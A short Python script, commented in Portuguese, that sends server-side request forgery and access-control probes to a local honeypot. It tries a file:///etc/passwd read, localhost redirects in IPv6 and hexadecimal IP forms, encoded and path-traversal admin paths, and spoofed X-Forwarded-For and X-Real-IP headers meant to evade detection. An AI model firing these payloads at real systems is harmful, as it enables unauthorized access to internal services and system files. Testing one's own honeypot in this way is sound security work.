import requests
import urllib.parse

def ssrf_test(target_url):
    # Casos de teste com diferentes técnicas de evasão
    test_cases = [
        {"url": f"{target_url}/admin", "desc": "Tentativa de acessar página administrativa"},
        {"url": f"{target_url}/internal", "desc": "Tentativa de acessar recurso interno"},
        {"url": f"{target_url}/sensitive", "desc": "Tentativa de acessar recurso sensível"},
        {"url": f"{target_url}/?url=http://localhost:8000", "desc": "Tentativa de redirecionamento"},
        {"url": f"{target_url}/?redirect=http://localhost:8000", "desc": "Tentativa de redirecionamento via parâmetro redirect"},
        {"url": f"{target_url}/?file=file:///etc/passwd", "desc": "Tentativa de acesso a arquivo local"},
        {"url": f"{target_url}/?url=https://example.com", "desc": "Tentativa de acessar URL externa"},
        {"url": f"{target_url}/%61%64%6d%69%6e", "desc": "Tentativa de acessar página administrativa com codificação de URL"},
        {"url": f"{target_url}/..%2fadmin", "desc": "Tentativa de path traversal para página administrativa"},
        {"url": f"{target_url}/?url=localhost", "desc": "Tentativa de redirecionamento sem http"},
        {"url": f"{target_url}/?url=http://127.0.0.1", "desc": "Tentativa de redirecionamento para localhost via IP"},
        {"url": f"{target_url}/?url=http://[::1]", "desc": "Tentativa de redirecionamento para localhost via IPv6"},
        {"url": f"{target_url}/?url=http://0x7f000001", "desc": "Tentativa de redirecionamento para localhost via IP hexadecimal"},
    ]

    # Cabeçalhos customizados para tentar evadir a detecção
    headers_list = [
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
        {"X-Forwarded-For": "127.0.0.1"},
        {"Referer": "http://example.com"},
        {"X-Real-IP": "127.0.0.1"}
    ]

    for case in test_cases:
        for headers in headers_list:
            print(f"Testando: {case['desc']} com headers {headers}")
            try:
                response = requests.get(case["url"], headers=headers)
                print(f"Resposta: {response.status_code}\nConteúdo: {response.content}\n")
            except Exception as e:
                print(f"Erro durante o teste: {e}")

# URL do honeypot
honey_pot_url = "http://localhost:8000"
ssrf_test(honey_pot_url)